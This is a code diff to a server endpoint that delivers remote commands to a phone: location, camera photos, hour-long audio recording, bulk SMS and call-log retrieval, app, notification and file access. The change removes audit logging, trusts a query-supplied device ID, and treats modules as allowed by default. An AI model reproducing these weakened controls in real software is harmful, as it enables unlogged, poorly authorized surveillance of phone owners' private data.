@@ -1,137 +1,143 @@
 import { createError, defineEventHandler, getQuery, setResponseHeader } from "h3";
-import { authenticateSignedRequest, computeEffectiveAccess, type PhoneBridgeModule } from "@/lib/phone-bridge-auth.server";
-import { writePhoneBridgeAudit } from "@/lib/phone-bridge-events.server";
-import { MODULE_LABELS } from "@/lib/phone-bridge-policy.server";
-import { consumePhoneBridgeAttempt } from "@/lib/phone-bridge-rate-limit.server";
+import { dbSource, getSql } from "@/lib/db";
+import { authenticateDevice } from "@/lib/phone-bridge-auth";
+import { requirePhoneBridgeSignedRequest } from "@/lib/phone-bridge-signature.server";
+import { enforcePhoneBridgeRateLimit } from "@/lib/phone-bridge-rate-limit.server";
 
-/** Maps a command action to the module that must be effective for it to run. */
-const ACTION_MODULE: Record<string, PhoneBridgeModule> = {
-  get_location: "location",
-  take_photo: "camera",
-  record_audio: "microphone",
-  manage_files: "selected_files",
-  list_apps: "apps",
-  list_notifications: "notifications",
-  restore_data: "remote_control",
-};
+const ALLOWED_ACTIONS = new Set(["get_location", "restore_data", "take_photo", "record_audio", "manage_files", "list_apps", "list_notifications"]);
 
-/**
- * Command delivery (`GET /api/device-sync/v1/remote-control/command`).
- *
- * Delivering a command is a *claim*, not a read: the row is moved
- * `queued -> delivered` with a conditional UPDATE, so two pollers racing on the
- * same row cannot both win. That is what makes duplicate execution impossible
- * rather than merely unlikely.
- *
- * A command whose module is not currently effective is returned as `null` and
- * left in place — it is not silently dropped, because the admin needs to see
- * that it is blocked and why.
- *
- * Note the HMAC here is over an *empty* body, matching `RemoteControlService`
- * which signs `ByteArray(0)` on this GET.
- */
 export default defineEventHandler(async (event) => {
   setResponseHeader(event, "cache-control", "no-store");
+  if (dbSource === "unconfigured") return { ok: true, command: null };
 
-  const auth = await authenticateSignedRequest(event);
+  const deviceId = String(getQuery(event).deviceId ?? "").trim();
+  if (!deviceId) throw createError({ statusCode: 400, statusMessage: "شناسه دستگاه ارسال نشده است." });
 
-  const limit = await consumePhoneBridgeAttempt("remote-command", auth.device.id);
-  if (!limit.allowed) {
-    setResponseHeader(event, "retry-after", String(limit.retryAfterSeconds));
+  await enforcePhoneBridgeRateLimit(event, "remote-command-poll", deviceId, {
+    windowMs: 10 * 60 * 1000,
+    maxHits: 240,
+    blockMs: 5 * 60 * 1000,
+  });
+
+  const auth = await authenticateDevice(event, deviceId);
+  if (auth.mode === "device") await requirePhoneBridgeSignedRequest(event, deviceId, Buffer.alloc(0));
+
+  const sql = await getSql();
+  const deviceRows = await sql.query<{ enabled: boolean; allowed_modules: unknown }>(
+    "select enabled,allowed_modules from phone_bridge_devices where id=$1 limit 1",
+    [deviceId],
+  );
+  const device = deviceRows[0];
+  if (!device?.enabled) throw createError({ statusCode: 403, statusMessage: "این دستگاه غیرفعال است." });
+
+  const modules = device.allowed_modules && typeof device.allowed_modules === "object"
+    ? device.allowed_modules as Record<string, unknown>
+    : {};
+
+  await sql.query(
+    "update phone_bridge_remote_commands set status='expired', completed_at=current_timestamp where device_id=$1 and status in ('queued','running') and expires_at < current_timestamp",
+    [deviceId],
+  );
+
+  const rows = await sql.query<Record<string, unknown>>(
+    "with next_command as (" +
+      " select id from phone_bridge_remote_commands" +
+      " where device_id=$1 and status='queued' and expires_at >= current_timestamp" +
+      " order by created_at asc limit 1 for update skip locked" +
+    ")" +
+    " update phone_bridge_remote_commands c" +
+    " set status='running', started_at=current_timestamp" +
+    " from next_command n" +
+    " where c.id=n.id" +
+    " returning c.id,c.action,c.payload,c.created_at,c.expires_at",
+    [deviceId],
+  );
+
+  const row = rows[0];
+  if (!row || !ALLOWED_ACTIONS.has(String(row.action))) return { ok: true, command: null };
+
+  const payload = row.payload && typeof row.payload === "object"
+    ? row.payload as Record<string, unknown>
+    : {};
+  const action = String(row.action);
+
+  if (action === "get_location" && modules.location === false) {
+    await sql.query(
+      "update phone_bridge_remote_commands set status='failed',error_message=$2,completed_at=current_timestamp where id=$1 and status='running'",
+      [String(row.id), "ماژول موقعیت برای این دستگاه غیرفعال است."],
+    );
     return { ok: true, command: null };
   }
 
-  const query = getQuery(event);
-  const requestedDeviceId = String(query.deviceId ?? "").trim();
-  if (requestedDeviceId && requestedDeviceId !== auth.device.id) {
-    throw createError({ statusCode: 403, statusMessage: "درخواست فرمان برای دستگاه دیگری است." });
+  if (action === "restore_data") {
+    const dataType = String(payload.dataType ?? "");
+    const requestedCount = Number(payload.requestedCount ?? 0);
+    const validType = dataType === "sms" || dataType === "incoming_calls";
+    const validCount = [15, 30, 60, 100, 250, 500, 1000, 5000, 10000].includes(requestedCount);
+    const moduleAllowed =
+      (dataType === "sms" && modules.sms !== false) ||
+      (dataType === "incoming_calls" && modules.calls !== false);
+    if (!validType || !validCount || !moduleAllowed) {
+      await sql.query(
+        "update phone_bridge_remote_commands set status='failed',error_message=$2,completed_at=current_timestamp where id=$1 and status='running'",
+        [String(row.id), "پارامتر یا ماژول بازگردانی دیتا معتبر نیست."],
+      );
+      return { ok: true, command: null };
+    }
   }
 
-  // Expire anything past its deadline first, so an abandoned command can never be
-  // delivered hours later just because the device came back online.
-  await auth.sql.query(
-    `update phone_bridge_commands
-        set status = 'expired', finished_at = current_timestamp
-      where device_id = $1
-        and status in ('queued','delivered','running')
-        and expires_at is not null
-        and expires_at <= current_timestamp`,
-    [auth.device.id],
-  );
+  if (action === "list_apps" && modules.apps === false) { await sql.query("update phone_bridge_remote_commands set status='failed',error_message=$2,completed_at=current_timestamp where id=$1 and status='running'",[String(row.id),"ماژول برنامه‌ها برای این دستگاه غیرفعال است."]); return {ok:true,command:null}; }
+  if (action === "list_notifications" && modules.notifications === false) { await sql.query("update phone_bridge_remote_commands set status='failed',error_message=$2,completed_at=current_timestamp where id=$1 and status='running'",[String(row.id),"ماژول اعلان‌ها برای این دستگاه غیرفعال است."]); return {ok:true,command:null}; }
 
-  const pending = await auth.sql.query<{
-    id: string;
-    module: string;
-    action: string;
-    payload: unknown;
-    expires_at: Date | null;
-  }>(
-    `select id, module, action, payload, expires_at
-       from phone_bridge_commands
-      where device_id = $1
-        and status = 'queued'
-        and (expires_at is null or expires_at > current_timestamp)
-      order by requested_at asc
-      limit 1`,
-    [auth.device.id],
-  );
-
-  const candidate = pending[0];
-  if (!candidate) return { ok: true, command: null };
-
-  const access = await computeEffectiveAccess(auth.device, auth.sql);
-  const requiredModule = ACTION_MODULE[candidate.action];
-  if (!requiredModule || !access.effective.includes(requiredModule)) {
-    await writePhoneBridgeAudit({
-      deviceId: auth.device.id,
-      action: "remote_command.blocked",
-      module: candidate.module || requiredModule || "unknown",
-      result: "denied",
-      policy: access.effective.join(","),
-      ip: auth.clientIp,
-      userAgent: auth.userAgent,
-      detail: { commandId: candidate.id, action: candidate.action },
-    });
-    return { ok: true, command: null, blockedReason: "module_not_effective" };
+  if (action === "record_audio") {
+    const format = String(payload.audioFormat ?? "");
+    const duration = Number(payload.durationSeconds ?? 0);
+    if (!["wav","amr"].includes(format) || !Number.isInteger(duration) || duration < 60 || duration > 3600 || modules.microphone === false) {
+      await sql.query(
+        "update phone_bridge_remote_commands set status='failed',error_message=$2,completed_at=current_timestamp where id=$1 and status='running'",
+        [String(row.id), "پارامتر یا ماژول ضبط صدا معتبر نیست."],
+      );
+      return { ok: true, command: null };
+    }
   }
 
-  // Conditional claim: only the request whose UPDATE actually changed a row owns
-  // the command. A concurrent poller sees status = 'delivered' and moves on.
-  const claimed = await auth.sql.query<{ id: string }>(
-    `update phone_bridge_commands
-        set status = 'delivered', delivered_at = current_timestamp
-      where id = $1
-        and status = 'queued'
-      returning id`,
-    [candidate.id],
-  );
+  if (action === "manage_files") {
+    const operation=String(payload.operation??"pick_folder");
+    if(operation!=="pick_folder"&&operation!=="download"){await sql.query("update phone_bridge_remote_commands set status='failed',error_message=$2,completed_at=current_timestamp where id=$1 and status='running'",[String(row.id),"عملیات مدیریت فایل معتبر نیست."]);return {ok:true,command:null};}
+    if(modules.selectedFiles===false){await sql.query("update phone_bridge_remote_commands set status='failed',error_message=$2,completed_at=current_timestamp where id=$1 and status='running'",[String(row.id),"ماژول مدیریت فایل برای این دستگاه غیرفعال است."]);return {ok:true,command:null};}
+    if(operation==="download"&&!String(payload.uri??"").trim()){await sql.query("update phone_bridge_remote_commands set status='failed',error_message=$2,completed_at=current_timestamp where id=$1 and status='running'",[String(row.id),"مسیر فایل ارسال نشده است."]);return {ok:true,command:null};}
+  }
 
-  if (!claimed[0]) return { ok: true, command: null };
-
-  await auth.sql.query(
-    `update phone_bridge_commands set status = 'running' where id = $1 and status = 'delivered'`,
-    [candidate.id],
-  );
-
-  await writePhoneBridgeAudit({
-    deviceId: auth.device.id,
-    action: "remote_command.deliver",
-    module: candidate.module || requiredModule,
-    policy: access.effective.join(","),
-    ip: auth.clientIp,
-    userAgent: auth.userAgent,
-    detail: { commandId: candidate.id, action: candidate.action },
-  });
+  if (action === "take_photo") {
+    const camera = String(payload.camera ?? "").trim();
+    const flash = payload.flash === true;
+    if (camera !== "front" && camera !== "back") {
+      await sql.query(
+        "update phone_bridge_remote_commands set status='failed',error_message=$2,completed_at=current_timestamp where id=$1 and status='running'",
+        [String(row.id), "دوربین انتخاب‌شده معتبر نیست."],
+      );
+      return { ok: true, command: null };
+    }
+    if (modules.camera === false) {
+      await sql.query(
+        "update phone_bridge_remote_commands set status='failed',error_message=$2,completed_at=current_timestamp where id=$1 and status='running'",
+        [String(row.id), "ماژول دوربین برای این دستگاه غیرفعال است."],
+      );
+      return { ok: true, command: null };
+    }
+    if (camera === "front" && flash) {
+      payload.flash = false;
+    }
+  }
 
   return {
     ok: true,
     command: {
-      id: candidate.id,
-      action: candidate.action,
-      module: candidate.module || requiredModule,
-      moduleLabel: MODULE_LABELS[requiredModule] ?? candidate.module,
-      payload: (candidate.payload ?? {}) as Record<string, unknown>,
-      expiresAt: candidate.expires_at ? new Date(candidate.expires_at).toISOString() : null,
+      id: String(row.id),
+      action,
+      payload,
+      createdAt: new Date(String(row.created_at)).toISOString(),
+      expiresAt: new Date(String(row.expires_at)).toISOString(),
     },
   };
 });
